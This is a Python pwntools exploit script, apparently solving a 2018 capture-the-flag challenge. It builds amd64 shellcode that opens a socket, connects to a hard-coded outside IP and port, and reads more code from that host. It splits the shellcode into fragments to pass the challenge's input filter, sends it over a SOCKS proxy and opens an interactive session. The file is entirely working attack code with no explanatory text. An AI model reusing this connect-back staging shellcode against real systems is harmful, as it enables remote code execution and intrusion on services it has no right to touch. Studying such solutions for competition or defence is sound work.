#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
context.arch="amd64"
context.proxy=(socks.SOCKS5,"10.211.55.2",1080)
conn=remote("wwdsm.chal.pwning.xxx",6615)
conn.recvuntil("?")

code="""
    mov    eax,0x29
    mov    edi,0xffffffd9
    mov    esi,3
    mov    edx,0
    add    edi,eax
    sub    esi,edi
    and    edx,esi
    syscall
    movabs rax,0x8a0a4b2f611e0002
    push   rax
    mov    eax,0x2a
    mov    edx,0x10
    mov    edi,0x0
    mov    rsi,rsp
    syscall
    mov    esi,0x0
    mov    edi,0x200
    mov    edx,0x200
    add    eax,0x4
    syscall
    mov    DWORD PTR [rbp-0x48],ecx
    /* 4 byte shellcode*/
    push rsp
    pop rsi
    .byte 106
    .byte 0xbf
    push 0x50
    pop rdx
    .byte 106
    .byte 0xbf
    .byte 0
    .byte 0
    .byte 0
    .byte 0
    .byte 0
    syscall
"""
"""

"""

shellcode=asm(code)

payload=shellcode[1:5]+shellcode[6:10]+shellcode[11:15]+shellcode[16:20]\
        +shellcode[30:38]+shellcode[40:44]+shellcode[45:49]+shellcode[50:54]\
        +shellcode[56]+shellcode[60:64]+shellcode[65:69]+shellcode[70:74]\
        +shellcode[76]+shellcode[80]+shellcode[82:86]+shellcode[87:91]\
        +shellcode[93:99]

pool=[i.encode("hex") for i in payload]
conn.sendline(" ".join(pool))

conn.recvuntil("Here's what you said:\n")
data=conn.recvuntil("\n\n")

print disasm(data.replace(" ","").replace("\n","").decode("hex"))
conn.interactive()

